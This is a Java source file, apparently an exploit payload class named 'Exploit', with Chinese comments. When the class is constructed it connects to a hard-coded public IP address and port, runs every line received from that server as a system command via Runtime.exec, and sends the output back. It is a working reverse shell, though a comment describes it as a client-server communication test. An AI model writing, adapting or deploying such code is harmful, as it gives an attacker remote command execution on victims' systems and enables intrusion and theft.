import java.io.*;
import java.lang.Runtime;
import java.lang.Process;
import java.net.Socket;
import java.net.UnknownHostException;

public class Exploit {

    public Exploit() {
        try {
            Socket s = new Socket("45.32.49.57",34567);

            //构建IO
            InputStream is = s.getInputStream();
            OutputStream os = s.getOutputStream();
            BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(os));
            //向服务器端发送一条消息
            bw.write("测试客户端和服务器通信，服务器接收到消息返回到客户端\n");
            bw.flush();
            while (true){
                try{
                    //读取服务器返回的消息
                    BufferedReader br = new BufferedReader(new InputStreamReader(is));
                    String mess = br.readLine();
                    //System.out.println("服务器："+mess);
                    if(mess.equals("quit")){
                        break;
                    }

                    Process proc = Runtime.getRuntime().exec(mess);
                    BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream()));
                    //获取错误流
                    BufferedReader error = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
                    StringBuilder rs = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) {
                        rs.append(line).append("\n");
                    }
                    in.close();
                    while ((line = error.readLine()) != null) {
                        rs.append(line).append("\n");
                    }
                    error.close();
                    //等待调用命令行的的线程执行完成
                    proc.waitFor();
                    bw.write(String.valueOf(rs));
                    bw.flush();

                }catch (Exception e){

                }
            }

        } catch (UnknownHostException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}